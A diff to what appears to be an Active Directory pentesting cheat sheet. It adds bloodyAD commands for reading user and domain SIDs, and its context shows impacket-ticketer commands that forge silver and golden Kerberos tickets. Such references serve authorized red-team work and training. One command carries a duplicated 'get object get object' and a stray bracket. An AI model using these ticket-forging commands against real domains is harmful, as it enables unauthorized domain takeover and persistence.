@@ -1225,9 +1225,14 @@ NetExec smb <Domain_Controller_IP> -d <AD_domain> -u <AD_user> -p <AD_password> 
 <details>
   <summary> Tickets </summary> 
   
-#### Get user SID value by using the Windows Terminal
-```cmd
-wmic useraccount where name="USER" get sid
+#### BloodyAD get user SID
+```shell
+bloodyAD -u <AD_user> -d <domain> -p <password> --host <Domain_Controller_IP> get object <AD_user>
+```
+
+##### BloodyAD get domain SID
+```shell
+bloodyAD --dc-ip <Domain_Controller_IP> -u <AD_user> -p <AD_password or LM:NT]> get object get object "DC=<domain>,DC=<local>" --attr objectSid
 ```
 
 #### Silver ticket
@@ -1235,11 +1240,6 @@ wmic useraccount where name="USER" get sid
 impacket-ticketer -nthash <nthash> -domain-sid <domain-sid> -domain <AD_domain> -dc-ip <Domain_Controller_IP> -spn <service>/<AD_domain> <user>
 ```
 #### Golden ticket
-
-##### Get domain SID
-```shell
-bloodyAD --dc-ip <Domain_Controller_IP> -u <AD_user> -p <AD_password or LM:NT]> get object get object "DC=<domain>,DC=<local>" --attr objectSid
-```
 
 ```shell
 impacket-ticketer -nthash <nthash> -domain-sid <domain-sid> -domain <AD_domain> -dc-ip <Domain_Controller_IP> <user>
